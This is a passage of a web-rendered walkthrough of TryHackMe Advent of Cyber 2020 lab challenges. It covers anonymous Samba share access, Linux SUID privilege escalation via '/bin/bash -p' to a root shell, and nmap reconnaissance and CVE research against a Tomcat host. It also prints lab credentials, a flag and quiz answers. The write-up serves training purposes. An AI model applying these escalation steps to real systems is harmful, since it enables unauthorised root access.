style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain"> ========================================== </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|    Share Enumeration on 10.10.111.123    |</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> ========================================== </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Sharename       Type      Comment</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        ---------       ----      -------</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        tbfc-hr         Disk      tbfc-hr</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        tbfc-it         Disk      tbfc-it</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        tbfc-santa      Disk      tbfc-santa</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        IPC$            IPC       IPC Service (tbfc-smb server (Samba, Ubuntu))</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="connecting-to-the-samba-server">Connecting to the Samba server<a href="#connecting-to-the-samba-server" class="hash-link" aria-label="Direct link to Connecting to the Samba server" title="Direct link to Connecting to the Samba server">​</a></h3><p>We can use smbclient to connect to the Samba servers. After some testing, I noticed that the tbfc-santa share doesn&#x27;t require a password to login as root.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">smbclient -U root //10.10.111.123/tbfc-santa</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>After logging in, we find the <code>jingle-tunes</code> directory and the <code>note_from_mcskidy.txt</code> file.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">smb: \&gt; ls</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  .                                   D        0  Wed Nov 11 21:12:07 2020</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  ..                                  D        0  Wed Nov 11 20:32:21 2020</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  jingle-tunes                        D        0  Wed Nov 11 21:10:41 2020</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  note_from_mcskidy.txt               N      143  Wed Nov 11 21:12:07 2020</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                10252564 blocks of size 1024. 5200032 blocks available</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>There is nothing else for us to look at. This is also the end of this challenge.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="day-11-the-rogue-gnome">Day 11: The Rogue Gnome<a href="#day-11-the-rogue-gnome" class="hash-link" aria-label="Direct link to Day 11: The Rogue Gnome" title="Direct link to Day 11: The Rogue Gnome">​</a></h2><p><em>Category: Networking</em><br>
<em>Tags: Privilege Escalation, Linux</em></p><blockquote><p>We&#x27;ve got initial access, but now what? Learn some of the common linux privilege escalation techniques used to gain permissions to things that we shouldn&#x27;t...</p></blockquote><p>IP: <code>10.10.43.93</code></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="basic-questions">Basic Questions<a href="#basic-questions" class="hash-link" aria-label="Direct link to Basic Questions" title="Direct link to Basic Questions">​</a></h3><h4 class="anchor anchorWithStickyNavbar_LWe7" id="what-type-of-privilege-escalation-involves-using-a-user-account-to-execute-commands-as-an-administrator">What type of privilege escalation involves using a user account to execute commands as an administrator?<a href="#what-type-of-privilege-escalation-involves-using-a-user-account-to-execute-commands-as-an-administrator" class="hash-link" aria-label="Direct link to What type of privilege escalation involves using a user account to execute commands as an administrator?" title="Direct link to What type of privilege escalation involves using a user account to execute commands as an administrator?">​</a></h4><p><code>vertical</code></p><h4 class="anchor anchorWithStickyNavbar_LWe7" id="what-is-the-name-of-the-file-that-contains-a-list-of-users-who-are-a-part-of-the-sudo-group">What is the name of the file that contains a list of users who are a part of the sudo group?<a href="#what-is-the-name-of-the-file-that-contains-a-list-of-users-who-are-a-part-of-the-sudo-group" class="hash-link" aria-label="Direct link to What is the name of the file that contains a list of users who are a part of the sudo group?" title="Direct link to What is the name of the file that contains a list of users who are a part of the sudo group?">​</a></h4><p><code>sudoers</code></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="connecting-via-ssh">Connecting via SSH<a href="#connecting-via-ssh" class="hash-link" aria-label="Direct link to Connecting via SSH" title="Direct link to Connecting via SSH">​</a></h3><p>For this challenge, we assume we have found a vulnerability to get a shell on the box. We can simulate this using an SSH connection with the credentials: <code>cmnatic:aoc2020</code>.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">ssh cmnatic@10.10.43.93</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>After connecting, we are greated with a bash shell:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">Last login: Fri Dec 11 18:17:18 2020 from 10.6.23.34</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-bash-4.4$ whoami</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">cmnatic</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="privilege-escalation">Privilege Escalation<a href="#privilege-escalation" class="hash-link" aria-label="Direct link to Privilege Escalation" title="Direct link to Privilege Escalation">​</a></h3><p>Unfortunately (and unsurprisingly), the account we are given doesn&#x27;t have root privileges.  </p><p>As suggested by THM, we can probably find a SUID binary to exploit. We can look for them by running:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">find / -perm -u=s -type f 2&gt;/dev/null</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>And we get the following output (note: I have ommited all of the snap files):</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">-bash-4.4$ find / -perm -u=s -type f 2&gt;/dev/null</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/bin/umount</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/bin/mount</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/bin/su</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/bin/fusermount</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/bin/bash</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/bin/ping</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/usr/bin/newgidmap</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/usr/bin/at</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/usr/bin/sudo</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/usr/bin/chfn</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/usr/bin/newgrp</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/usr/bin/passwd</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/usr/bin/gpasswd</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/usr/bin/pkexec</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/usr/bin/newuidmap</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/usr/bin/traceroute6.iputils</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/usr/bin/chsh</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/usr/lib/openssh/ssh-keysign</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/usr/lib/policykit-1/polkit-agent-helper-1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/usr/lib/eject/dmcrypt-get-device</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/usr/lib/snapd/snap-confine</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>OMG, <code>/bin/bash</code> is a SUID binary?!?! Ok, this looks really easy! I check out the <a href="https://gtfobins.github.io/gtfobins/bash/" target="_blank" rel="noopener noreferrer">GTFObins</a> entry for bash and find out how to run it using SUID. Turns out all I need to type is <code>/bin/bash -p</code>. I run that command and boom, I have a shell as root!</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">bash-4.4# whoami</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">root</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><strong><em>Another way to find the misconfigured SUID binaries would be to use <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS" target="_blank" rel="noopener noreferrer">Linpeas</a></em></strong></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="getting-the-flag-3">Getting the flag<a href="#getting-the-flag-3" class="hash-link" aria-label="Direct link to Getting the flag" title="Direct link to Getting the flag">​</a></h3><p>Now that I am root, getting the flag is very straight forward. All we need to do is <code>cat</code> the flag!</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">cat /root/flag.txt</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Flag: <code>thm{2fb10afe933296592}</code></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="day-12-ready-set-elf">Day 12: Ready, set, elf!<a href="#day-12-ready-set-elf" class="hash-link" aria-label="Direct link to Day 12: Ready, set, elf!" title="Direct link to Day 12: Ready, set, elf!">​</a></h2><p><em>Category: Networking</em><br>
<em>Tags: Public Exploits</em></p><blockquote><p>Learn how vulnerabilities can be identified, use public knowledgebases to search for exploits and leverage these on this Windows box; So quit slackin&#x27; and get whackin&#x27;!</p></blockquote><p>IP: <code>10.10.143.182</code></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="vulnerability-knowledge-bases">Vulnerability Knowledge Bases<a href="#vulnerability-knowledge-bases" class="hash-link" aria-label="Direct link to Vulnerability Knowledge Bases" title="Direct link to Vulnerability Knowledge Bases">​</a></h3><p>Examples include:</p><ul><li>Rapid7</li><li>AttackerKB</li><li>MITRE</li><li>Exploit-DB</li></ul><h3 class="anchor anchorWithStickyNavbar_LWe7" id="basic-enumeration-5">Basic enumeration<a href="#basic-enumeration-5" class="hash-link" aria-label="Direct link to Basic enumeration" title="Direct link to Basic enumeration">​</a></h3><p>Before we begin, we ping the machine:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">bluemoon@dragonfly:~/ctf/thm/thm-advent/day12-ready-set-elf$ ping 10.10.143.182</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">PING 10.10.143.182 (10.10.143.182) 56(84) bytes of data.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">^C</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">--- 10.10.143.182 ping statistics ---</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">4 packets transmitted, 0 received, 100% packet loss, time 3065ms</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Interesting, this machine doesn&#x27;t respond to ping requests... anyways, we shall forge ahead.</p><p>First, we can use Nmap to scan the machine.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">nmap -sC -sV -Pn -oN nmap.log 10.10.143.182</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>We get the following results:</p><div class="language-log codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-log codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain"># Nmap 7.80 scan initiated Sat Dec 12 14:14:26 2020 as: nmap -sC -sV -Pn -oN nmap.log 10.10.143.182</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Nmap scan report for 10.10.143.182</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Host is up (0.11s latency).</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Not shown: 997 filtered ports</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">PORT     STATE SERVICE       VERSION</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">3389/tcp open  ms-wbt-server Microsoft Terminal Services</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| rdp-ntlm-info: </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   Target_Name: TBFC-WEB-01</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   NetBIOS_Domain_Name: TBFC-WEB-01</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   NetBIOS_Computer_Name: TBFC-WEB-01</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   DNS_Domain_Name: tbfc-web-01</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   DNS_Computer_Name: tbfc-web-01</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   Product_Version: 10.0.17763</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_  System_Time: 2020-12-12T19:14:46+00:00</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| ssl-cert: Subject: commonName=tbfc-web-01</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| Not valid before: 2020-11-27T01:29:04</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_Not valid after:  2021-05-29T01:29:04</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_ssl-date: 2020-12-12T19:14:47+00:00; -1s from scanner time.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">8009/tcp open  ajp13         Apache Jserv (Protocol v1.3)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| ajp-methods: </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_  Supported methods: GET HEAD POST OPTIONS</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">8080/tcp open  http          Apache Tomcat 9.0.17</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_http-favicon: Apache Tomcat</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_http-title: Apache Tomcat/9.0.17</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"># Nmap done at Sat Dec 12 14:14:48 2020 -- 1 IP address (1 host up) scanned in 21.81 seconds</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="what-is-the-version-number-of-the-web-server">What is the version number of the web server?<a href="#what-is-the-version-number-of-the-web-server" class="hash-link" aria-label="Direct link to What is the version number of the web server?" title="Direct link to What is the version number of the web server?">​</a></h3><p>We can see the HTTP Apache Tomcat server is running on port 8080. In the Nmap scan, we can also see that the version number is <code>9.0.17</code>.</p><p>Here is what the webpage looks like if we open it in a browser:</p><p><img loading="lazy" alt="screenshot" src="/assets/images/apache_tomcat-88c8df451d1b7b17e90747a030fb54a8.png" width="1600" height="770" class="img_ev3q"></p><p>Based on the lesson writeup from CMNatic, I also check out <code>http://10.10.143.182:8080/cgi-bin/elfwhacker.bat</code> and I found this:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">-------------------------------------------------------</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Written by ElfMcEager for The Best Festival Company ~CMNatic</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-------------------------------------------------------</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Current time: 12/12/2020 20:33:34.06</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-------------------------------------------------------</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                 Debugging Information</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-------------------------------------------------------</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Hostname: TBFC-WEB-01</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">User: tbfc-web-01\elfmcskidy</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-------------------------------------------------------</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                  ELF WHACK COUNTER</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-------------------------------------------------------</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> Number of Elves whacked and sent back to work: 31469</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="finding-the-vulnerability-using-searchsploit">Finding the vulnerability using searchsploit<a href="#finding-the-vulnerability-using-searchsploit" class="hash-link" aria-label="Direct link to Finding the vulnerability using searchsploit" title="Direct link to Finding the vulnerability using searchsploit">​</a></h3><p>I used <a href="https://www.cvedetails.com/version/280286/Apache-Tomcat-9.0.17.html" target="_blank" rel="noopener noreferrer">CVE Details</a> to find the vulnerabilities affecting <code>Apache Tomcat v9.0.17</code>.</p><p><img loading="lazy" alt="screenshot" src="/assets/images/cve_details_overview-f8e6b4091e8481bfd089784c8d50cdd4.png" width="1396" height="393" class="img_ev3q"></p><p>I then found out that <a href="https://www.cvedetails.com/vulnerability-list/vendor_id-45/product_id-887/version_id-280286/year-2019/opec-1/Apache-Tomcat-9.0.17.html" target="_blank" rel="noopener noreferrer"><code>CVE-2019-0232</code></a> would allow me to gain remote code execution.</p><p><img loading="lazy" alt="screenshot" src="/assets/images/cve_details_vuln-c42bde458e4db1a59b7537fcebf1fbb6.png" width="1403" height="364" class="img_ev3q"></p><p>The description say:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text 